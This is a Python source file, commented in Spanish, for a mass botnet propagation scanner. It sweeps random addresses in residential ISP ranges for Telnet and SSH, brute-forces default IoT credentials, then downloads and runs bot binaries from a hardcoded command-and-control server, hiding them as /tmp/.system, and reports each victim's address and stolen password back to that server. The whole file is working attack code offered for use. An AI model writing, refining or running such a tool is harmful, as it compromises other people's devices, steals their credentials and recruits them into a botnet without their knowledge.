#!/usr/bin/env python3
"""
SCANNER MASIVO - Configurado para CNC en 172.96.140.62
Modo: sudo python3 scanner_final.py
"""

import socket
import telnetlib
import paramiko
import threading
import queue
import time
import random
import ipaddress
import sys
import os
import subprocess
import struct
import select
from paramiko import SSHClient, AutoAddPolicy
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========= CONFIGURACIÓN TUYA =========
YOUR_CNC_IP = "172.96.140.62"
CNC_REPORT_PORT = 14037      # Humanis
CNC_BOT_PORT = 14038         # Bots
HTTP_PORT = 11202            # HTTP server

# URLs EXACTAS de tus bots
BOT_URLS = {
    "default": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/x86",
    "x86_64": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/x86_64",
    "x86": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/x86",
    "arm": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/arm",
    "arm5": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/arm5",
    "arm6": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/arm6",
    "arm7": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/arm7",
    "mips": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/mips",
    "mipsel": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/mipsel",
    "aarch64": f"http://{YOUR_CNC_IP}:{HTTP_PORT}/bot/compiled_bots/aarch64"
}

# ========= CONFIG SCANNER =========
MAX_THREADS = 2500
SCAN_TIMEOUT = 5
BATCH_SIZE = 100000
MAX_DEPLOY_PER_CYCLE = 500

# Colores
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

# ========= CREDENCIALES ACTUALIZADAS =========
TELNET_CREDS = [
    ("root", ""),
    ("admin", ""),
    ("root", "root"),
    ("admin", "admin"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "12345"),
    ("admin", "12345"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", "admin"),
    ("admin", "root"),
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    ("default", ""),
    ("root", "default"),
    ("admin", "default"),
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "juantech"),
    ("root", "7ujMko0vizxv"),
    ("root", "Zte521"),
    ("ubnt", "ubnt"),
    ("root", "admin123"),
    ("root", "888888"),
    ("root", "54321"),
    ("root", "1111"),
    ("root", "toor"),
    ("root", "daredevil"),
    ("admin", "admin@huawei"),
    ("root", "Zte521@2019"),
    ("admin", "Telecom@123"),
    ("root", "Admin@123"),
    ("admin", "Admin@2023"),
    ("root", "Root@2023"),
]

SSH_CREDS = [
    ("root", ""),
    ("admin", ""),
    ("root", "root"),
    ("admin", "admin"),
    ("root", "1234"),
    ("root", "123456"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("test", "test"),
    ("guest", "guest"),
    ("root", "toor"),
    ("root", "password"),
    ("admin", "password"),
]

# ========= GENERADOR DE IPs MEJORADO =========
class IPGenerator:
    @staticmethod
    def generate_massive_batch():
        """Genera IPs de rangos con alta densidad de dispositivos IoT"""
        ranges = [
            # América del Norte
            ("24.0.0.0", "24.255.255.255"),  # Comcast
            ("50.0.0.0", "50.255.255.255"),  # Comcast
            ("66.0.0.0", "66.255.255.255"),  # Comcast
            ("71.0.0.0", "71.255.255.255"),  # Verizon
            ("73.0.0.0", "73.255.255.255"),  # Comcast
            ("76.0.0.0", "76.255.255.255"),  # Comcast
            ("96.0.0.0", "96.63.255.255"),   # AT&T
            ("98.0.0.0", "98.255.255.255"),  # AT&T
            ("104.0.0.0", "104.255.255.255"),# Cloudflare/Proveedores
            ("107.0.0.0", "107.255.255.255"),# Spectrum
            
            # Europa
            ("84.0.0.0", "84.255.255.255"),  # Orange
            ("85.0.0.0", "85.255.255.255"),  # Telecom Italia
            ("86.0.0.0", "86.255.255.255"),  # Telefonica
            ("87.0.0.0", "87.255.255.255"),  # Deutsche Telekom
            ("88.0.0.0", "88.255.255.255"),  # Free
            ("89.0.0.0", "89.255.255.255"),  # ISP varios
            
            # Asia/Latam
            ("177.0.0.0", "177.255.255.255"),# Brasil
            ("179.0.0.0", "179.255.255.255"),# Brasil
            ("181.0.0.0", "181.255.255.255"),# Argentina
            ("186.0.0.0", "186.255.255.255"),# Colombia
            ("187.0.0.0", "187.255.255.255"),# México
            ("189.0.0.0", "189.255.255.255"),# Brasil
            ("190.0.0.0", "190.255.255.255"),# Argentina
            ("191.0.0.0", "191.255.255.255"),# Chile
            ("200.0.0.0", "200.255.255.255"),# América Latina
        ]
        
        ips = []
        total_needed = BATCH_SIZE
        
        for start, end in ranges:
            if len(ips) >= total_needed:
                break
                
            start_int = int(ipaddress.IPv4Address(start))
            end_int = int(ipaddress.IPv4Address(end))
            range_size = end_int - start_int
            
            # Tomar muestra proporcional del rango
            samples = min(5000, total_needed - len(ips))
            
            for _ in range(samples):
                ip_int = random.randint(start_int, end_int)
                ip = str(ipaddress.IPv4Address(ip_int))
                
                # Saltar IPs problemáticas
                if not (ip.endswith(".0") or ip.endswith(".255")):
                    ips.append(ip)
        
        # Completar con IPs aleatorias si es necesario
        while len(ips) < total_needed:
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if not (ip.startswith("10.") or ip.startswith("192.168.") or 
                   (ip.startswith("172.") and 16 <= int(ip.split('.')[1]) <= 31)):
                ips.append(ip)
        
        return ips[:total_needed]

# ========= ESCANEADOR HIPERRÁPIDO =========
class UltraScanner:
    def __init__(self):
        self.stats = {
            'total_scanned': 0,
            'open_ports': 0,
            'successful_logins': 0,
            'bots_deployed': 0,
            'cycle': 0,
            'start_time': time.time()
        }
        self.lock = threading.Lock()
    
    def mass_scan(self, ips, ports=[23, 2323, 22, 2222, 80, 443, 8080]):
        """Escaneo masivo multi-puerto"""
        results = {port: [] for port in ports}
        
        def scan_port(port, ip_list):
            open_ips = []
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SCAN_TIMEOUT)
            
            for ip in ip_list:
                try:
                    if sock.connect_ex((ip, port)) == 0:
                        open_ips.append(ip)
                except:
                    continue
            
            sock.close()
            with self.lock:
                results[port] = open_ips
                self.stats['open_ports'] += len(open_ips)
        
        # Dividir IPs por puerto
        chunk_size = len(ips) // len(ports)
        threads = []
        
        for i, port in enumerate(ports):
            start = i * chunk_size
            end = start + chunk_size if i < len(ports) - 1 else len(ips)
            ip_chunk = ips[start:end]
            
            thread = threading.Thread(target=scan_port, args=(port, ip_chunk))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=SCAN_TIMEOUT * 2)
        
        with self.lock:
            self.stats['total_scanned'] += len(ips)
        
        return results

# ========= DEPLOYER INTELIGENTE =========
class SmartDeployer:
    def __init__(self):
        self.cnc_ip = YOUR_CNC_IP
        self.report_port = CNC_REPORT_PORT
        self.success_count = 0
    
    def deploy_to_target(self, ip, port, scanner_type="TELNET"):
        """Despliega bot en un objetivo"""
        success = False
        credentials = None
        architecture = "unknown"
        
        if scanner_type == "TELNET":
            success, credentials, architecture = self._deploy_telnet(ip, port)
        elif scanner_type == "SSH":
            success, credentials, architecture = self._deploy_ssh(ip, port)
        
        if success and credentials:
            # Reportar al CNC
            self._report_to_cnc(ip, port, credentials, architecture)
            
            with threading.Lock():
                self.success_count += 1
            
            return True
        
        return False
    
    def _deploy_telnet(self, ip, port):
        """Despliega via Telnet"""
        for username, password in TELNET_CREDS:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=8)
                time.sleep(0.5)
                
                # Auto-detectar prompt de login
                tn.write(b"\n")
                time.sleep(0.3)
                initial = tn.read_very_eager()
                
                if b"login:" in initial.lower() or b"username:" in initial.lower():
                    tn.write(username.encode() + b"\n")
                    time.sleep(0.5)
                    tn.write(password.encode() + b"\n")
                    time.sleep(1)
                else:
                    # Intentar login directo
                    tn.write(username.encode() + b"\n")
                    time.sleep(0.5)
                    tn.write(password.encode() + b"\n")
                    time.sleep(1)
                
                # Verificar login
                tn.write(b"echo DEPLOY_TEST\n")
                time.sleep(0.5)
                response = tn.read_very_eager()
                
                if b"DEPLOY_TEST" not in response:
                    tn.close()
                    continue
                
                # Detectar arquitectura
                arch = self._detect_arch_telnet(tn)
                
                # Descargar bot
                bot_url = BOT_URLS.get(arch, BOT_URLS["default"])
                download_commands = [
                    f"cd /tmp && wget {bot_url} -O .system 2>/dev/null",
                    f"cd /tmp && curl {bot_url} -o .system 2>/dev/null",
                    f"cd /tmp && busybox wget {bot_url} -O .system 2>/dev/null",
                    f"cd /tmp && tftp -g -l .system -r {bot_url} 2>/dev/null",
                    f"cd /tmp && ftpget {bot_url} .system 2>/dev/null",
                ]
                
                for cmd in download_commands:
                    tn.write(cmd.encode() + b"\n")
                    time.sleep(2)
                    tn.write(b"ls -la /tmp/.system 2>/dev/null && echo DOWNLOAD_OK\n")
                    time.sleep(1)
                    check = tn.read_very_eager()
                    if b"DOWNLOAD_OK" in check:
                        break
                
                # Ejecutar
                tn.write(b"chmod +x /tmp/.system 2>/dev/null\n")
                time.sleep(0.5)
                tn.write(b"cd /tmp && ./.system >/dev/null 2>&1 &\n")
                time.sleep(1)
                tn.write(b"ps | grep .system | grep -v grep\n")
                time.sleep(1)
                
                final = tn.read_very_eager()
                tn.close()
                
                if b".system" in final:
                    print(f"{GREEN}[+] Bot desplegado: {ip}:{port} ({arch}) - {username}:{password}{RESET}")
                    return True, (username, password), arch
                
            except Exception as e:
                continue
        
        return False, None, "unknown"
    
    def _deploy_ssh(self, ip, port):
        """Despliega via SSH"""
        for username, password in SSH_CREDS:
            try:
                ssh = SSHClient()
                ssh.set_missing_host_key_policy(AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password,
                          timeout=6, look_for_keys=False, allow_agent=False)
                
                # Detectar arquitectura
                stdin, stdout, stderr = ssh.exec_command("uname -m", timeout=3)
                arch_output = stdout.read().decode('utf-8', errors='ignore').lower()
                
                if "x86_64" in arch_output or "amd64" in arch_output:
                    arch = "x86_64"
                elif "i386" in arch_output or "i686" in arch_output:
                    arch = "x86"
                elif "arm" in arch_output:
                    if "armv5" in arch_output: arch = "arm5"
                    elif "armv6" in arch_output: arch = "arm6"
                    elif "armv7" in arch_output: arch = "arm7"
                    else: arch = "arm"
                elif "mips" in arch_output:
                    arch = "mipsel" if "mipsel" in arch_output else "mips"
                elif "aarch64" in arch_output:
                    arch = "aarch64"
                else:
                    arch = "default"
                
                # URL del bot
                bot_url = BOT_URLS.get(arch, BOT_URLS["default"])
                
                # Comando de deploy
                deploy_cmd = f"""
                cd /tmp || cd /var/tmp || cd /dev/shm;
                wget {bot_url} -O .sys 2>/dev/null || curl {bot_url} -o .sys 2>/dev/null || busybox wget {bot_url} -O .sys 2>/dev/null;
                chmod +x .sys;
                nohup ./.sys >/dev/null 2>&1 &
                sleep 1;
                """
                
                ssh.exec_command(deploy_cmd, timeout=8)
                time.sleep(2)
                
                # Verificar
                stdin, stdout, stderr = ssh.exec_command("ps aux | grep .sys | grep -v grep | head -1", timeout=3)
                check = stdout.read().decode()
                
                ssh.close()
                
                if ".sys" in check:
                    print(f"{GREEN}[+] SSH Bot desplegado: {ip}:{port} ({arch}){RESET}")
                    return True, (username, password), arch
                    
            except Exception as e:
                continue
        
        return False, None, "unknown"
    
    def _detect_arch_telnet(self, tn):
        """Detecta arquitectura via Telnet"""
        try:
            tn.write(b"uname -m\n")
            time.sleep(0.5)
            output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
            
            if "x86_64" in output or "amd64" in output:
                return "x86_64"
            elif "i386" in output or "i686" in output:
                return "x86"
            elif "arm" in output:
                if "armv5" in output: return "arm5"
                elif "armv6" in output: return "arm6"
                elif "armv7" in output: return "arm7"
                else: return "arm"
            elif "mips" in output:
                return "mipsel" if "mipsel" in output else "mips"
            elif "aarch64" in output:
                return "aarch64"
            else:
                return "default"
        except:
            return "default"
    
    def _report_to_cnc(self, ip, port, credentials, architecture):
        """Reporta al CNC en 14037"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.cnc_ip, self.report_port))
            
            report_msg = f"SCAN|{ip}:{port}|{credentials[0]}:{credentials[1]}|{architecture}|{int(time.time())}\n"
            sock.send(report_msg.encode())
            
            sock.close()
            return True
        except:
            return False

# ========= SCANNER PRINCIPAL =========
class MassScanner:
    def __init__(self):
        self.scanner = UltraScanner()
        self.deployer = SmartDeployer()
        self.running = True
        self.cycle_count = 0
        
    def print_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{CYAN}
╔══════════════════════════════════════════════════════════════╗
║               MASS SCANNER v5.0 - CONFIGURADO                ║
║                    CNC: {YOUR_CNC_IP}:{CNC_REPORT_PORT}                    ║
║                    BOTS: {YOUR_CNC_IP}:{HTTP_PORT}                    ║
╚══════════════════════════════════════════════════════════════╝{RESET}
        """)
    
    def print_stats(self):
        elapsed = time.time() - self.scanner.stats['start_time']
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        
        ips_sec = self.scanner.stats['total_scanned'] / elapsed if elapsed > 0 else 0
        
        print(f"\n{GREEN}══════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}CICLO: {self.cycle_count} | TIEMPO: {hrs:02d}:{mins:02d}:{secs:02d}{RESET}")
        print(f"{CYAN}VELOCIDAD: {ips_sec:.0f} IPs/seg | THREADS: {MAX_THREADS}{RESET}")
        print(f"{GREEN}══════════════════════════════════════════════════════════════{RESET}")
        print(f"{YELLOW}IPs TOTAL ESCANEADAS: {self.scanner.stats['total_scanned']:,}{RESET}")
        print(f"{YELLOW}PUERTOS ABIERTOS: {self.scanner.stats['open_ports']:,}{RESET}")
        print(f"{MAGENTA}LOGINS EXITOSOS: {self.scanner.stats['successful_logins']:,}{RESET}")
        print(f"{GREEN}BOTS DESPLEGADOS: {self.scanner.stats['bots_deployed']:,}{RESET}")
        print(f"{CYAN}REPORTES CNC: {self.deployer.success_count:,}{RESET}")
        print(f"{GREEN}══════════════════════════════════════════════════════════════{RESET}\n")
    
    def run_cycle(self):
        self.cycle_count += 1
        print(f"{BLUE}[CICLO {self.cycle_count}] Iniciando escaneo masivo...{RESET}")
        
        # 1. Generar IPs
        print(f"{CYAN}[1/3] Generando {BATCH_SIZE:,} IPs objetivo...{RESET}")
        target_ips = IPGenerator.generate_massive_batch()
        
        # 2. Escaneo masivo
        print(f"{CYAN}[2/3] Escaneando puertos...{RESET}")
        ports_to_scan = [23, 2323, 22, 2222, 80, 443, 8080, 21, 25, 53, 81, 82, 83, 84, 85]
        scan_results = self.scanner.mass_scan(target_ips, ports_to_scan)
        
        # 3. Procesar resultados y desplegar
        print(f"{CYAN}[3/3] Desplegando bots...{RESET}")
        
        deployment_targets = []
        
        # Agrupar por tipo de servicio
        for port, ips in scan_results.items():
            if not ips:
                continue
                
            if port in [23, 2323]:
                scanner_type = "TELNET"
            elif port in [22, 2222]:
                scanner_type = "SSH"
            else:
                continue  # Solo Telnet/SSH por ahora
            
            for ip in ips[:100]:  # Limitar a 100 por puerto por ciclo
                deployment_targets.append((ip, port, scanner_type))
        
        # Desplegar en paralelo
        if deployment_targets:
            print(f"{GREEN}[+] {len(deployment_targets)} objetivos para deploy{RESET}")
            
            with ThreadPoolExecutor(max_workers=200) as executor:
                futures = []
                for target in deployment_targets:
                    future = executor.submit(self.deployer.deploy_to_target, *target)
                    futures.append(future)
                
                for future in as_completed(futures):
                    try:
                        success = future.result(timeout=10)
                        if success:
                            with threading.Lock():
                                self.scanner.stats['successful_logins'] += 1
                                self.scanner.stats['bots_deployed'] += 1
                    except:
                        pass
    
    def run(self):
        self.print_banner()
        print(f"{YELLOW}[!] Presiona CTRL+C para detener{RESET}")
        print(f"{CYAN}[+] Usando CNC: {YOUR_CNC_IP}:{CNC_REPORT_PORT}{RESET}")
        print(f"{CYAN}[+] Bots desde: {YOUR_CNC_IP}:{HTTP_PORT}{RESET}")
        
        # Optimizar sistema
        self._optimize_system()
        
        try:
            while self.running:
                start_time = time.time()
                self.run_cycle()
                cycle_time = time.time() - start_time
                
                self.print_stats()
                
                # Esperar dinámicamente
                wait_time = max(10, 30 - int(cycle_time))
                if wait_time > 0:
                    print(f"{YELLOW}[+] Esperando {wait_time} segundos...{RESET}")
                    for i in range(wait_time, 0, -1):
                        sys.stdout.write(f"\r{YELLOW}[+] Siguiente ciclo en: {i}s {' ' * 10}{RESET}")
                        sys.stdout.flush()
                        time.sleep(1)
                    print()
                
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Detenido por usuario{RESET}")
        except Exception as e:
            print(f"\n{RED}[!] Error: {e}{RESET}")
            import traceback
            traceback.print_exc()
        finally:
            self.running = False
            self.print_stats()
            print(f"\n{GREEN}[+] Scanner finalizado{RESET}")
    
    def _optimize_system(self):
        """Optimiza el sistema para escaneo masivo"""
        if os.geteuid() != 0:
            return
            
        print(f"{CYAN}[+] Optimizando sistema...{RESET}")
        
        optimizations = [
            "sysctl -w net.ipv4.tcp_tw_reuse=1",
            "sysctl -w net.ipv4.ip_local_port_range='1024 65535'",
            "sysctl -w net.ipv4.tcp_fin_timeout=30",
            "sysctl -w net.core.somaxconn=65535",
            "sysctl -w net.ipv4.tcp_max_syn_backlog=65535",
            "ulimit -n 999999 2>/dev/null",
        ]
        
        for cmd in optimizations:
            try:
                os.system(cmd)
            except:
                pass

# ========= EJECUCIÓN =========
def main():
    # Verificar root
    if os.geteuid() != 0:
        print(f"{RED}[!] ERROR: Debes ejecutar como root{RESET}")
        print(f"{RED}[!] Usa: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)
    
    # Verificar conexión al CNC
    print(f"{CYAN}[+] Probando conexión al CNC...{RESET}")
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((YOUR_CNC_IP, CNC_REPORT_PORT))
        sock.close()
        print(f"{GREEN}[+] CNC {YOUR_CNC_IP}:{CNC_REPORT_PORT} - Conectado{RESET}")
    except:
        print(f"{YELLOW}[!] CNC no responde, continuando igual...{RESET}")
    
    # Iniciar scanner
    scanner = MassScanner()
    scanner.run()

if __name__ == "__main__":
    main()
  